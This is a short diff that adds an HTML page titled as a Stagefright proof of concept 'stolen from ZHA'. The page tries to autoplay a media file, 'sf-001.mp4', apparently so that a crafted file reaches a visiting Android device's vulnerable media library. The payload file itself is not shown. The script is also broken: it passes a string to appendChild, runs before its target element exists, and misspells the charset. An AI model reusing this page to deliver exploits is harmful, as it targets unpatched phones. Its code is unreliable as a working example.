@@ -1,0 +1,28 @@
+<!-- -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UFT-8">
+<title>Stagefright - various - poc stolen from ZHA</title>
+<script>
+    var main=document.getElementById("main"),
+        ls=['sf-001.mp4']
+    for(var i in ls){
+        main.appendChild(`
+        <audio src="/${ls[i]}" controls autoplay>
+            <p>Your browser does not support the <code>audio</code> element </p>
+        </audio>
+        <video src="/${ls[i]}" controls autoplay>
+            <p>Your browser does not support the <code>video</code> element.</p>
+        </video>
+        `)
+    }
+</script>
+</head>
+<body>
+<div id="main">...</div>
+<audio src="audio.ogg" controls autoplay loop>
+<p>Your browser does not support the <code>audio</code> element </p>
+</audio>
+</body>		
+</html>
